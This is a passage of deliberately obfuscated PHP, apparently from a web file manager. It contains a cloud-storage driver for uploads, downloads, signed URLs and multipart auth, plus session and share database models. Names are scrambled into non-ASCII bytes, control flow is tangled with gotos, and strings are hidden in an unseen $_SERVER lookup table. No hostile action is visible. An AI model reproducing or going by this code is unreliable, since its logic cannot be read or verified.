$dšßÚâà¼à[18] : $eÄ‘ñÛÖÊ; $eáóãˆ›ò = get_file_mime(get_path_ext($eÄ‘ñÛÖÊ)); goto D“ºˆÅ‘Š‰; D“ºˆÅ‘Š‰: $c¹Ö³á“‘— = $this->client->putObject($b³ŠÍ„˜, $this->bucket, $eÄ‘ñÛÖÊ, $dšßÚâà¼à[195], array(), $eáóãˆ›ò); if (!$c¹Ö³á“‘—) { return !1; } if ($Aê¬Ç§íŒ) { return !0; } goto D·„„ß­Ö; D·„„ß­Ö: $c¹Ö³á“‘— = $this->copyFile($eÄ‘ñÛÖÊ, $eÄ‘ñÛÖÊ, array($dšßÚâà¼à[206] => $c¹Ö³á“‘—[$dšßÚâà¼à[207]])); return $c¹Ö³á“‘— ? !0 : !1; goto eº‹…’ù¾; eº‹…’ù¾: } public function fileSubstr($aïĞªº“×Ç, $EÂ“êï‘ß±, $c¯ñãÌ¼¨) { $bñ•à¥Ù† = $EÂ“êï‘ß± + $c¯ñãÌ¼¨ - 1; return $this->client->getObject($this->bucket, $aïĞªº“×Ç, array($_SERVER[©][208] => "\x62\x79\x74\x65\163\x3d{$EÂ“êï‘ß±}\x2d{$bñ•à¥Ù†}")); } public function upload($C²°ŠˆŸå, $dèÏÊÌË§º, $d„äÇ¾Œ¡ = false, $F³Àò½×…´ = REPEAT_REPLACE) { $eóÖËŞÙ‹¡ =& $_SERVER[©]; $D£¢­Éç¿ = array($eóÖËŞÙ‹¡[206] => @md5_file($dèÏÊÌË§º)); $bÊŞßˆ‘Ìİ = array($eóÖËŞÙ‹¡[209] => get_file_mime(get_path_ext($C²°ŠˆŸå))); if (IO::size($dèÏÊÌË§º) <= 1024 * 1024 * 200) { $c°ÊÇİ˜ïŒ = $this->client->putObjectFile($dèÏÊÌË§º, $this->bucket, $C²°ŠˆŸå, $eóÖËŞÙ‹¡[195], $D£¢­Éç¿, $bÊŞßˆ‘Ìİ); return !empty($c°ÊÇİ˜ïŒ) ? $this->getPathOuter($C²°ŠˆŸå) : !1; } $bŸ™Äçß¡¶ = $this->client->multiUploadObject($dèÏÊÌË§º, $this->bucket, trim($C²°ŠˆŸå, $eóÖËŞÙ‹¡[18]), $D£¢­Éç¿, $bÊŞßˆ‘Ìİ); return $bŸ™Äçß¡¶ ? $this->getPathOuter($C²°ŠˆŸå) : !1; } public function download($A˜ÒÓÔÁöÆ, $bì–ªß§«) { if (!@is_dir($this->pathFather($bì–ªß§«)) && !IO::mkdir($this->pathFather($bì–ªß§«))) { return !1; } $dİøºÖ†Ô½ = $this->client->getObject($this->bucket, $A˜ÒÓÔÁöÆ, array(), $bì–ªß§«); return $dİøºÖ†Ô½ !== !1 ? $bì–ªß§« : !1; } public function link($C†œ‰Ùƒ¦õ, $Eù‰—£íÑ = array()) { $d³ñ­«¢á =& $_SERVER[©]; if ($this->signVer == $d³ñ­«¢á[210]) { return $this->client->getAuthenticatedURL($this->bucket, $C†œ‰Ùƒ¦õ, 3600 * 12, $Eù‰—£íÑ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($C†œ‰Ùƒ¦õ, $d³ñ­«¢á[18]), 3600 * 12, $this->region, array(), !0, $Eù‰—£íÑ); } public function fileOut($aˆöÜİãÓ¹, $Cê¾İ¦ƒë = false, $d…‹ÖŸ¿ ä = false, $fÜ¹êä¶Ï‰ = '') { goto d«‡°«Şº; F‹¬¡ìÚèš: $d¨ÂÎ½ŸÅ = $this->link($aˆöÜİãÓ¹, $EÖñ•ù¢Ä); $this->fileOutLink($d¨ÂÎ½ŸÅ); goto DŠ÷¾·ï¶; d«‡°«Şº: $BØì¨³Ú×É =& $_SERVER[©]; if (!$d…‹ÖŸ¿ ä) { $d…‹ÖŸ¿ ä = $this->pathThis($aˆöÜİãÓ¹); } $aÚ±«‰çñâ = get_file_mime(get_path_ext($d…‹ÖŸ¿ ä)); goto CÓ³Ç„…ŞÂ; CÓ³Ç„…ŞÂ: if ($aÚ±«‰çñâ == $BØì¨³Ú×É[211]) { return parent::fileOut($aˆöÜİãÓ¹, $Cê¾İ¦ƒë, $d…‹ÖŸ¿ ä, $fÜ¹êä¶Ï‰); } $Cê¾İ¦ƒë = $Cê¾İ¦ƒë ? $BØì¨³Ú×É[212] : $BØì¨³Ú×É[213]; $EÖñ•ù¢Ä = array($BØì¨³Ú×É[214] => $Cê¾İ¦ƒë . $BØì¨³Ú×É[215] . rawurlencode($d…‹ÖŸ¿ ä), $BØì¨³Ú×É[216] => $aÚ±«‰çñâ); goto F‹¬¡ìÚèš; DŠ÷¾·ï¶: } public function fileOutServer($bö­ëù²°Œ, $Fœçù‚šîê = false, $AÕĞÉÆ¬È = false, $dŒ‰‰ØÑİ¼ = '') { parent::fileOut($bö­ëù²°Œ, $Fœçù‚šîê, $AÕĞÉÆ¬È, $dŒ‰‰ØÑİ¼); } public function fileOutImage($cÁáÔïŒ¢¾, $Cª›¨ÊŠÒ = 250) { $AãÎ‘áî‘Î = $this->link($cÁáÔïŒ¢¾); $this->fileOutLink($AãÎ‘áî‘Î); } public function fileOutImageServer($F‹ÖÃÄÀà¶, $AËËÚä¤á± = 250) { parent::fileOutImage($F‹ÖÃÄÀà¶, $AËËÚä¤á±); } public function hashMd5($D›ìâ‚§«, $fÔ¤ÑÀ‘¥ = '') { $C š£· ˆ¬ =& $_SERVER[©]; $B×íƒêØ¥ƒ = $this->objectMeta($D›ìâ‚§«); if (!$B×íƒêØ¥ƒ) { return !1; } $fÔ¤ÑÀ‘¥ = $fÔ¤ÑÀ‘¥ ? $fÔ¤ÑÀ‘¥ : _get($B×íƒêØ¥ƒ, $C š£· ˆ¬[217]); $fÔ¤ÑÀ‘¥ = $fÔ¤ÑÀ‘¥ ? $fÔ¤ÑÀ‘¥ : _get($B×íƒêØ¥ƒ, $C š£· ˆ¬[207], $C š£· ˆ¬[43]); return $fÔ¤ÑÀ‘¥; } public function uploadFormData($bÍ‹…°˜×, $A¾‹÷ŒäøØ = 3600) { $dó±•†ŞÌ =& $_SERVER[©]; $c©óá¹ŠÌ = $this->pathFather($bÍ‹…°˜×); $cĞİßˆ½“ = $this->client->getHttpUploadPostParams($this->bucket, $c©óá¹ŠÌ, $dó±•†ŞÌ[195], $A¾‹÷ŒäøØ); return array_merge((array) $cĞİßˆ½“, array($dó±•†ŞÌ[179] => $this->getHost())); } public function multiUploadFormData($D“²Şô•‘, $BÌ©ß‹‚Àô = 3600) { $E“·ÊÙÂŸÒ =& $_SERVER[©]; $E§­İ„Ÿ†˜ = gmdate($E“·ÊÙÂŸÒ[218]); $d®öğ†ù™ = array(); $F²„ƒ¢‚¸ = $this->client->getUploadId($this->bucket, $D“²Şô•‘, $d®öğ†ù™); if (!$F²„ƒ¢‚¸) { return !1; } return array($E“·ÊÙÂŸÒ[219] => $F²„ƒ¢‚¸, $E“·ÊÙÂŸÒ[179] => $this->getHost() . $E“·ÊÙÂŸÒ[18] . $this->pathEncode($D“²Şô•‘), $E“·ÊÙÂŸÒ[220] => $E§­İ„Ÿ†˜, $E“·ÊÙÂŸÒ[99] => $D“²Şô•‘); } public function multiUploadAuthData($cÔò´Èƒ, $CÄğéÖÃµ = array()) { goto CÒÒ¿ÀªÙ¨; CÒÒ¿ÀªÙ¨: $c¯ŸÈµ‚Ş =& $_SERVER[©]; $CÁáÄğí = isset($CÄğéÖÃµ[$c¯ŸÈµ‚Ş[220]]) ? $CÄğéÖÃµ[$c¯ŸÈµ‚Ş[220]] : gmdate($c¯ŸÈµ‚Ş[218]); $EßÕÆØğ»† = isset($CÄğéÖÃµ[$c¯ŸÈµ‚Ş[170]]) ? $CÄğéÖÃµ[$c¯ŸÈµ‚Ş[170]] : $c¯ŸÈµ‚Ş[43]; goto e˜‘­ôß®; cÆÙïˆ˜æØ: $Fìß§¬‚ŒÖ = implode($c¯ŸÈµ‚Ş[9], $bç°ôÒãËò); $DÇÈ÷È„ƒ‚ = base64_encode(hash_hmac($c¯ŸÈµ‚Ş[227], $Fìß§¬‚ŒÖ, $this->secret, !0)); $E§¢¼çÎŒ = $c¯ŸÈµ‚Ş[228] . $this->accessKey . $c¯ŸÈµ‚Ş[14] . $DÇÈ÷È„ƒ‚; goto C»ÅèÆàØ; DõÃäÅô›±: $bç°ôÒãËò = array($c¯ŸÈµ‚Ş[222], $c¯ŸÈµ‚Ş[43], $c¯ŸÈµ‚Ş[126], $c¯ŸÈµ‚Ş[43], "\170\x2d\141\x6d\172\x2d\144\141\164\x65\72{$CÁáÄğí}", $c¯ŸÈµ‚Ş[18] . $this->bucket . $c¯ŸÈµ‚Ş[18] . $this->pathEncode($E» ¯êäš£) . $EßÕÆØğ»†); if (strpos($EßÕÆØğ»†, $c¯ŸÈµ‚Ş[223]) === 0) { $bç°ôÒãËò[0] = $c¯ŸÈµ‚Ş[224]; } if (isset($CÄğéÖÃµ[$c¯ŸÈµ‚Ş[225]]) && $CÄğéÖÃµ[$c¯ŸÈµ‚Ş[225]] == $c¯ŸÈµ‚Ş[226]) { $bç°ôÒãËò[0] = $c¯ŸÈµ‚Ş[226]; } goto cÆÙïˆ˜æØ; C»ÅèÆàØ: if (strpos($EßÕÆØğ»†, $c¯ŸÈµ‚Ş[223]) === 0) { return array($c¯ŸÈµ‚Ş[229] => $E§¢¼çÎŒ, $c¯ŸÈµ‚Ş[220] => $CÁáÄğí); } return $E§¢¼çÎŒ; goto c„ŒÜ–š‡ø; e˜‘­ôß®: $E» ¯êäš£ = $CÄğéÖÃµ[$c¯ŸÈµ‚Ş[99]]; unset($CÄğéÖÃµ[$c¯ŸÈµ‚Ş[99]]); if (isset($CÄğéÖÃµ[$c¯ŸÈµ‚Ş[221]])) { $CÄğéÖÃµ[$c¯ŸÈµ‚Ş[220]] = $CÁáÄğí; return $this->listUploadParts($E» ¯êäš£, $CÄğéÖÃµ); } goto DõÃäÅô›±; c„ŒÜ–š‡ø: } public function listUploadParts($fßŞ ÔÀ×ß, $e‹ÒÀùŸ²• = array()) { goto bğõ“ÂğÇ; aßÀ„¼¨ÀŸ: if (!$DºÅŠà®) { return !1; } unset($e‹ÒÀùŸ²•[$cÚ¬ÓÏË‹„[221]], $e‹ÒÀùŸ²•[$cÚ¬ÓÏË‹„[225]]); $e‹ÒÀùŸ²•[$cÚ¬ÓÏË‹„[99]] = $fßŞ ÔÀ×ß; goto eĞ·È‚¶…; bğõ“ÂğÇ: $cÚ¬ÓÏË‹„ =& $_SERVER[©]; $AË¢­—‡•ø = str_replace($cÚ¬ÓÏË‹„[230], $cÚ¬ÓÏË‹„[43], $e‹ÒÀùŸ²•[$cÚ¬ÓÏË‹„[170]]); $DºÅŠà® = $this->client->listParts($this->bucket, $fßŞ ÔÀ×ß, $AË¢­—‡•ø); goto aßÀ„¼¨ÀŸ; eĞ·È‚¶…: $CÆ½ê”¸‡— = $this->multiUploadAuthData($fßŞ ÔÀ×ß, $e‹ÒÀùŸ²•); if (empty($CÆ½ê”¸‡—)) { return !1; } return array($cÚ¬ÓÏË‹„[229] => $CÆ½ê”¸‡—, $cÚ¬ÓÏË‹„[220] => $e‹ÒÀùŸ²•[$cÚ¬ÓÏË‹„[220]], $cÚ¬ÓÏË‹„[231] => $DºÅŠà®); goto a‹‰Á¸í”ê; a‹‰Á¸í”ê: } public function getHost() { return parent::getHost() . $_SERVER[©][18] . $this->bucket; } public function size($D¾Šö¾­…) { $DÉÏÔ˜Ä ø = $this->objectMeta($D¾Šö¾­…); return $DÉÏÔ˜Ä ø ? $DÉÏÔ˜Ä ø[$_SERVER[©][87]] : 0; } public function info($D›â”µ­»ƒ) { if ($this->isFolder($D›â”µ­»ƒ)) { return $this->folderInfo($D›â”µ­»ƒ); } else { if ($this->isFile($D›â”µ­»ƒ)) { return $this->fileInfo($D›â”µ­»ƒ); } } return !1; } public function exist($a•ù¨éäù) { return $this->isFile($a•ù¨éäù) || $this->isFolder($a•ù¨éäù); } public function isFile($D—‹„¶ññ¹) { return !$this->isFolder($D—‹„¶ññ¹) && $this->objectMeta($D—‹„¶ññ¹); } public function isFolder($B¹õ†Éó¹ô) { return $this->cacheMethod($_SERVER[©][232], $B¹õ†Éó¹ô); } protected function objectMeta($DÆÀàÙ­ÂŞ) { return $this->cacheMethod($_SERVER[©][233], $DÆÀàÙ­ÂŞ); } protected function _objectMeta($DªÖõ‘ïŠ) { $bÉ‰ÅÇÁˆ¢ =& $_SERVER[©]; $DªÖõ‘ïŠ = rtrim($DªÖõ‘ïŠ, $bÉ‰ÅÇÁˆ¢[18]); try { $bæ“æàÛæ§ = $this->client->getObjectInfo($this->bucket, $DªÖõ‘ïŠ); if (!isset($bæ“æàÛæ§[$bÉ‰ÅÇÁˆ¢[217]]) && isset($bæ“æàÛæ§[$bÉ‰ÅÇÁˆ¢[234]])) { $bæ“æàÛæ§[$bÉ‰ÅÇÁˆ¢[217]] = $bæ“æàÛæ§[$bÉ‰ÅÇÁˆ¢[234]]; } } catch (Exception $aóéÑø‡á‹) { $bæ“æàÛæ§ = !1; } if (!$bæ“æàÛæ§) { } return $bæ“æàÛæ§; } protected function _isFolder($c¹Ö‚çğ©) { goto a¤ÕõŒ×ñÑ; eÛèãÅŠˆ: $eéòî•ñ‹Œ = $this->client->getBucket($this->bucket, $c¹Ö‚çğ©, null, 1); if (empty($eéòî•ñ‹Œ)) { return !1; } $eéòî•ñ‹Œ = array_values($eéòî•ñ‹Œ); goto dÓ‘†µ¾ù¾; dÓ‘†µ¾ù¾: if (substr($eéòî•ñ‹Œ[0][$fµ ¦Á°×¤[38]], -1) == $fµ ¦Á°×¤[18]) { return !0; } if (get_path_this($eéòî•ñ‹Œ[0][$fµ ¦Á°×¤[38]]) == get_path_this($c¹Ö‚çğ©)) { return !1; } return !0; goto bóšéˆÉÕà; a¤ÕõŒ×ñÑ: $fµ ¦Á°×¤ =& $_SERVER[©]; $c¹Ö‚çğ© = rtrim($c¹Ö‚çğ©, $fµ ¦Á°×¤[18]); if ($c¹Ö‚çğ© == $fµ ¦Á°×¤[43] || $c¹Ö‚çğ© == $fµ ¦Á°×¤[18]) { return !0; } goto eÛèãÅŠˆ; bóšéˆÉÕà: } } goto c—º‡²ÑÁ—; A™¶ÊµÕ’Ã: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\155\x5f\x73\x65\x73\x73\x69\157\156"; public function get($C’¶™ã¢) { $aÇ‡ºˆà‚ç =& $_SERVER[©]; $Aì‘Ù“‘² = $this->where(array($aÇ‡ºˆà‚ç[2206] => $C’¶™ã¢))->find(); if (!is_array($Aì‘Ù“‘²)) { return !1; } return $Aì‘Ù“‘²[$aÇ‡ºˆà‚ç[691]]; } public function set($dßìÄœøèÊ, $CƒÍ‘´°Ó, $Cîœ˜‰Æ™ = 3600) { $f°¤Ò¡ÑÜ =& $_SERVER[©]; $D…ÑêÜçÀè = array($f°¤Ò¡ÑÜ[2206] => $dßìÄœøèÊ, $f°¤Ò¡ÑÜ[2132] => $CƒÍ‘´°Ó, $f°¤Ò¡ÑÜ[2207] => $Cîœ˜‰Æ™ + time()); if (Session::get($f°¤Ò¡ÑÜ[2208])) { $D…ÑêÜçÀè[$f°¤Ò¡ÑÜ[1434]] = Session::get($f°¤Ò¡ÑÜ[2208]); } else { $D…ÑêÜçÀè[$f°¤Ò¡ÑÜ[1434]] = 0; } if ($this->get($dßìÄœøèÊ)) { return $this->where(array($f°¤Ò¡ÑÜ[2206] => $dßìÄœøèÊ))->save($D…ÑêÜçÀè); } else { return $this->add($D…ÑêÜçÀè, array(), !0); } } public function remove($BÒğÆïİõö) { return $this->where(array($_SERVER[©][2206] => $BÒğÆïİõö))->delete(); } public function clearTimeout() { return $this->where($_SERVER[©][2209] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\124\x69\155\x65", "\x74\x69\x6d\x65", "\151\x6e\x73\x65\x72\164\54\165\160\144\141\x74\145", "\x66\x75\156\143\x74\x69\157\x6e"), array("\x63\162\145\x61\164\145\x54\x69\x6d\x65", "\164\x69\155\145", "\151\156\163\145\162\164", "\146\165\156\x63\x74\x69\157\156"), array("\157\160\x74\x69\x6f\x6e\x73", '', "\x69\156\x73\x65\162\164\x2c\165\x70\144\x61\x74\145\x2c\x73\145\154\145\x63\x74", "\x6a\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($e÷¨ÔÜÀ‹½) { $DãŸñòŸ¢³ =& $_SERVER[©]; $a…ÓŒè¶… = isset($e÷¨ÔÜÀ‹½[0]) ? $e÷¨ÔÜÀ‹½[0] : !1; return array($DãŸñòŸ¢³[2210] => array(USER_ID, $DãŸñòŸ¢³[2211]), $DãŸñòŸ¢³[2170] => array($a…ÓŒè¶…, $DãŸñòŸ¢³[2212])); } protected function listSimple() { $fÁÅêøºáö = array($_SERVER[©][1434] => USER_ID); $Fò¢—ĞÄ® = $this->field($this->fieldList)->where($fÁÅêøºáö)->select(); return $Fò¢—ĞÄ® ? $Fò¢—ĞÄ® : array(); } protected function getInfo($E–‘‘ÑÜÓÎ, $A„™Ë¢ÄšÔ = false) { $d‡†¯ÙâŒÂ =& $_SERVER[©]; if ($A„™Ë¢ÄšÔ) { return $this->_getShareInfo(array($d‡†¯ÙâŒÂ[449] => $E–‘‘ÑÜÓÎ)); } $dš”Æ˜ğÀ = $this->cacheFunctionGet($d‡†¯ÙâŒÂ[2213], $E–‘‘ÑÜÓÎ); return $dš”Æ˜ğÀ; } public function getInfoByHash($f˜Ó¤ˆáÍ) { return $this->_getShareInfo(array($_SERVER[©][451] => $f˜Ó¤ˆáÍ)); } public function getInfoByPath($E¦æ÷…ëæ¥) { $A·øÛ³”¦ƒ =& $_SERVER[©]; $BøêÊğôö¶ = array($A·øÛ³”¦ƒ[1434] => USER_ID, $A·øÛ³”¦ƒ[377] => $E¦æ÷…ëæ¥); return $this->_getShareInfo($BøêÊğôö¶); } public function getInfoBySourcePath($fâê¿ó¾µÇ) { $f¿‹âä—®Â =& $_SERVER[©]; $eçïŠƒé“ª = array($f¿‹âä—®Â[1434] => USER_ID, $f¿‹âä—®Â[1016] => $fâê¿ó¾µÇ); return $this->_getShareInfo($eçïŠƒé“ª); } private function _getShareInfo($f¸†ÏÍ˜Ç‘) { goto DáöĞéÕ„; DáöĞéÕ„: $Dš¡˜ºÊğ =& $_SERVER[©]; $Eå–ïóî¹ê = $this->where($f¸†ÏÍ˜Ç‘)->find(); if (!$Eå–ïóî¹ê) { return !1; } goto b±†––¨™Ç; AŸêó×Îá©: if ($Eå–ïóî¹ê[$Dš¡˜ºÊğ[377]] == $Dš¡˜ºÊğ[476]) { $Eå–ïóî¹ê[$Dš¡˜ºÊğ[399]] = IO::info($Eå–ïóî¹ê[$Dš¡˜ºÊğ[1016]]); } else { $Eå–ïóî¹ê[$Dš¡˜ºÊğ[399]] = Model($Dš¡˜ºÊğ[1114])->pathInfo($Eå–ïóî¹ê[$Dš¡˜ºÊğ[377]]); } $Eå–ïóî¹ê[$Dš¡˜ºÊğ[2215]] = $FÌ“°Ã; return $Eå–ïóî¹ê; goto Fù¤ˆÅ‹„Š; b±†––¨™Ç: $f¸†ÏÍ˜Ç‘ = array($Dš¡˜ºÊğ[449] => $Eå–ïóî¹ê[$Dš¡˜ºÊğ[449]]); $F³Ş±ƒ§Æ = $Dš¡˜ºÊğ[2214]; $FÌ“°Ã = Model($Dš¡˜ºÊğ[545])->order($Dš¡˜ºÊğ[375])->field($F³Ş±ƒ§Æ)->where($f¸†ÏÍ˜Ç‘)->select(); goto AŸêó×Îá©; Fù¤ˆÅ‹„Š: } protected function getInfoAuth($c”‹÷ˆ˜ƒ) { $fÒğ„–‡œ =& $_SERVER[©]; $D‘³ ·Íˆ­ = $this->getInfo($c”‹÷ˆ˜ƒ); $D‘³ ·Íˆ­[$fÒğ„–‡œ[384]] = Model($fÒğ„–‡œ[462])->authMake($D‘³ ·Íˆ­[$fÒğ„–‡œ[2215]]); return $D‘³ ·Íˆ­; } protected function listData($eÛãëšàÜ‹ = null, $C ØĞó¢ã¼ = 300) { $cõ­Ù½°‰ =& $_SERVER[©]; $bö”ï°õ = array(array($cõ­Ù½°‰[454] => array($cõ­Ù½°‰[923], 0), $cõ­Ù½°‰[456] => array($cõ­Ù½°‰[923], 0), $cõ­Ù½°‰[2216] => $cõ­Ù½°‰[2184])); if ($eÛãëšàÜ‹ == $cõ­Ù½°‰[1868]) { $bö”ï°õ = array($cõ­Ù½°‰[454] => 1); } else { if ($eÛãëšàÜ‹ == $cõ­Ù½°‰[1005]) { $bö”ï°õ = array($cõ­Ù½°‰[456] => 1); } } $bö”ï°õ[$cõ­Ù½°‰[1434]] = USER_ID; $Dî÷Îùà¡ = $this->where($bö”ï°õ)->selectPage($C ØĞó¢ã¼); return $Dî÷Îùà¡; } protected function listToMe($e§¨³æ©× = 300) { goto D’Øî¤©½õ; D’Øî¤©½õ: $Dš²‚–¤·÷ =& $_SERVER[©]; $F¹ñˆàÜæ = Session::get($Dš²‚–¤·÷[2217]); $dİ³©Ê¼º = array_to_keyvalue($F¹ñˆàÜæ, $Dš²‚–¤·÷[43], $Dš²‚–¤·÷[2102]); goto C…Óñ®¢îˆ; bêì¾›Š†: $Bªê—èô¨´ = array_to_keyvalue_group($A©Ä™˜ëÇ[$Dš²‚–¤·÷[363]], $Dš²‚–¤·÷[449]); if (!$Bªê—èô¨´) { return $A©Ä™˜ëÇ; } $e´ˆøÉŸ†½ = $Dš²‚–¤·÷[2218]; goto dŒïİ†‚Öª; dŒïİ†‚Öª: $fèËÍ—­‰ = array($Dš²‚–¤·÷[449] => array($Dš²‚–¤·÷[392], array_keys($Bªê—èô¨´))); $e™©‹’Æã¸ = $this->field($e´ˆøÉŸ†½)->where($fèËÍ—­‰)->select(); foreach ($e™©‹’Æã¸ as $AíèÈ™˜×Ğ => &$DŸ˜Ù½Õö¤) { $DŸ˜Ù½Õö¤[$Dš²‚–¤·÷[2215]] = $Bªê—èô¨´[$DŸ˜Ù½Õö¤[$Dš²‚–¤·÷[449]]]; } goto F±½æ„ÍŞŞ; C…Óñ®¢îˆ: $fèËÍ—­‰ = array($Dš²‚–¤·÷[529] => SourceModel::TYPE_USER, $Dš²‚–¤·÷[464] => USER_ID); if ($dİ³©Ê¼º) { $fèËÍ—­‰ = array(array($Dš²‚–¤·÷[529] => SourceModel::TYPE_USER, $Dš²‚–¤·÷[464] => USER_ID), array($Dš²‚–¤·÷[529] => SourceModel::TYPE_GROUP, $Dš²‚–¤·÷[464] => array($Dš²‚–¤·÷[17], $dİ³©Ê¼º)), $Dš²‚–¤·÷[2216] => $Dš²‚–¤·÷[2184]); } $A©Ä™˜ëÇ = Model($Dš²‚–¤·÷[545])->where($fèËÍ—­‰)->selectPage($e§¨³æ©×); goto bêì¾›Š†; F±½æ„ÍŞŞ: $ağÑ¶ÇÙ™ñ = array($Dš²‚–¤·÷[2219] => $e™©‹’Æã¸, $Dš²‚–¤·÷[2220] => $A©Ä™˜ëÇ[$Dš²‚–¤·÷[360]]); return $ağÑ¶ÇÙ™ñ; goto C£åêÄ±; C£åêÄ±: } protected function shareAdd($EÉš±¢½”, $C®„’¾ŒŞ) { $bÇÊìŠßÜ‰ =& $_SERVER[©]; $cƒ–¾Û–î = $this->_addShareData($EÉš±¢½”, $C®„’¾ŒŞ); if (!empty($C®„’¾ŒŞ[$bÇÊìŠßÜ‰[2221]])) { $this->_shareAuthSet($cƒ–¾Û–î, $C®„’¾ŒŞ[$bÇÊìŠßÜ‰[2221]]); } $this->shareEventAdd($EÉš±¢½”, $C®„’¾ŒŞ, $bÇÊìŠßÜ‰[1008]); return $cƒ–¾Û–î; } private function shareEventAdd($aÅóÊ«èœÆ, $DÈìŞ‚ª‹ê, $C˜Êæ³Êçë = "\141\x64\144") { goto d£Ş½ôçÚ; bÃ›Ÿ¼ï„: return; goto Eµé—¸©—£; cï¿¬‰Ù÷•: $cğ—¤—Ì÷ = $e‘˜„³Ù•Ó[2224]; if ($a¼ÌØÉ»ø[$e‘˜„³Ù•Ó[454]] == $e‘˜„³Ù•Ó[476] && $DÈìŞ‚ª‹ê[$e‘˜„³Ù•Ó[454]] == $e‘˜„³Ù•Ó[93]) { $cğ—¤—Ì÷ = $e‘˜„³Ù•Ó[2222]; } if ($a¼ÌØÉ»ø[$e‘˜„³Ù•Ó[454]] == $e‘˜„³Ù•Ó[93] && $DÈìŞ‚ª‹ê[$e‘˜„³Ù•Ó[454]] == $e‘˜„³Ù•Ó[476]) { $cğ—¤—Ì÷ = $e‘˜„³Ù•Ó[2225]; } goto eÍÇíæƒ÷—; eÍÇíæƒ÷—: if ($a¼ÌØÉ»ø[$e‘˜„³Ù•Ó[456]] == $e‘˜„³Ù•Ó[476] && $DÈìŞ‚ª‹ê[$e‘˜„³Ù•Ó[456]] == $e‘˜„³Ù•Ó[93]) { $cğ—¤—Ì÷ = $e‘˜„³Ù•Ó[2223]; } if ($a¼ÌØÉ»ø[$e‘˜„³Ù•Ó[456]] == $e‘˜„³Ù•Ó[93] && $DÈìŞ‚ª‹ê[$e‘˜„³Ù•Ó[456]] == $e‘˜„³Ù•Ó[476]) { $cğ—¤—Ì÷ = $e‘˜„³Ù•Ó[2226]; } Model($e‘˜„³Ù•Ó[513])->eventShare($aÅóÊ«èœÆ, $cğ—¤—Ì÷); goto bÃ›Ÿ¼ï„; d£Ş½ôçÚ: $e‘˜„³Ù•Ó =& $_SERVER[©]; if ($C˜Êæ³Êçë == $e‘˜„³Ù•Ó[1008]) { if ($DÈìŞ‚ª‹ê[$e‘˜„³Ù•Ó[454]] == $e‘˜„³Ù•Ó[93]) { Model($e‘˜„³Ù•Ó[513])->eventShare($aÅóÊ«èœÆ, $e‘˜„³Ù•Ó[2222]); } if ($DÈìŞ‚ª‹ê[$e‘˜„³Ù•Ó[456]] == $e‘˜„³Ù•Ó[93]) { Model($e‘˜„³Ù•Ó[513])->eventShare($aÅóÊ«èœÆ, $e‘˜„³Ù•Ó[2223]); } return; } $a¼ÌØÉ»ø = $this->getInfoByPath($aÅóÊ«èœÆ); goto cï¿¬‰Ù÷•; Eµé—¸©—£: } private function _addShareData($D•¬…ç‹•¬, $D„Ñ­Š½õ¢ = array()) { goto bÅÍÏ†Š±Æ; bçÔŒí„Ç®: $E³—¹Á…Âç = $this->add($C‡áÖ«§âè); $eá¦×ˆÓÌ» = array($e²éİ‚²È®[451] => short_id($E³—¹Á…Âç)); $this->where(array($e²éİ‚²È®[448] => $E³—¹Á…Âç))->save($eá¦×ˆÓÌ»); goto F™» ‰È˜Ş; A¢Øª›ÁÚÚ: $C‡áÖ«§âè = array($e²éİ‚²È®[1425] => USER_ID, $e²éİ‚²È®[391] => $D•¬…ç‹•¬, $e²éİ‚²È®[1338] => $e²éİ‚²È®[43], $e²éİ‚²È®[454] => 0, $e²éİ‚²È®[456] => 0, $e²éİ‚²È®[1016] => $e²éİ‚²È®[43], $e²éİ‚²È®[304] => $e²éİ‚²È®[43], $e²éİ‚²È®[799] => $e²éİ‚²È®[43], $e²éİ‚²È®[2228] => 0, $e²éİ‚²È®[2229] => 0, $e²éİ‚²È®[702] => 0, $e²éİ‚²È®[2230] => $e²éİ‚²È®[43], $e²éİ‚²È®[451] => $e²éİ‚²È®[43]); $fŠ‹ŠÂí = explode($e²éİ‚²È®[57], $e²éİ‚²È®[2231]); foreach ($fŠ‹ŠÂí as $FäÅ·¶ëƒŒ) { if (!isset($D„Ñ­Š½õ¢[$FäÅ·¶ëƒŒ])) { continue; } $C‡áÖ«§âè[$FäÅ·¶ëƒŒ] = $D„Ñ­Š½õ¢[$FäÅ·¶ëƒŒ]; } goto bçÔŒí„Ç®; D¯×ÍÍíÃ¥: if ($cßª±‹‹Ç = $this->where($bğŒÑùƒâÙ)->find()) { return $cßª±‹‹Ç[$e²éİ‚²È®[449]]; } if ($D•¬…ç‹•¬ == 0) { $Dµò§ºÆ Ì = array($e²éİ‚²È®[38] => get_path_this($D„Ñ­Š½õ¢[$e²éİ‚²È®[85]])); } else { $Dµò§ºÆ Ì = Model($e²éİ‚²È®[752])->sourceInfo($D•¬…ç‹•¬); if (!$Dµò§ºÆ Ì) { return !1; } } if (!$D„Ñ­Š½õ¢[$e²éİ‚²È®[1338]]) { $D„Ñ­Š½õ¢[$e²éİ‚²È®[1338]] = $Dµò§ºÆ Ì[$e²éİ‚²È®[38]]; } goto A¢Øª›ÁÚÚ; F™» ‰È˜Ş: return $E³—¹Á…Âç; goto f»¢¯°Ûøİ; bÅÍÏ†Š±Æ: $e²éİ‚²È® =& $_SERVER[©]; $bğŒÑùƒâÙ = array($e²éİ‚²È®[391] => $D•¬…ç‹•¬, $e²éİ‚²È®[1425] => USER_ID); if ($D•¬…ç‹•¬ == 0) { $bğŒÑùƒâÙ = array($e²éİ‚²È®[2227] => $D„Ñ­Š½õ¢[$e²éİ‚²È®[1016]], $e²éİ‚²È®[1425] => USER_ID); } goto D¯×ÍÍíÃ¥; f»¢¯°Ûøİ: } private function _shareAuthSet($dÛ…ª¡›ñ÷, $e×¢¼„òó¡) { goto døàÖÒ¦§; AùòöŠ˜äŠ: $BÕÚñëœèå->where(array($B°ˆ‰ Ñâ[449] => $dÛ…ª¡›ñ÷))->delete(); $f¬ø¾ï®„ = array(); foreach ($e×¢¼„òó¡ as $bÙ±›Õ¡•Ç) { $Aï–ŒæĞñ« = SourceModel::TYPE_USER; if ($bÙ±›Õ¡•Ç[$B°ˆ‰ Ñâ[379]] == SourceModel::TYPE_GROUP) { $Aï–ŒæĞñ« = SourceModel::TYPE_GROUP; } $CÑÃƒ‘–öÑ = array($B°ˆ‰ Ñâ[449] => 